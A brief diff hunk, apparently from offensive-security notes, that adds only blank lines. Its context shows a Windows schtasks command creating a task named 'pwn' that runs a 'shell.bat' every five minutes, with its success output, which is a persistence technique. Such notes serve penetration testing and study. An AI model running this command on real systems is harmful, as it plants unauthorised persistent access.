@@ -23,3 +23,5 @@ schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\$_PATH\$_SCRIPT.ba
 C:\>schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\Windows\Tasks\shell.bat"
 SUCCESS: The scheduled task "pwn" has successfully been created.
 ```
+
+
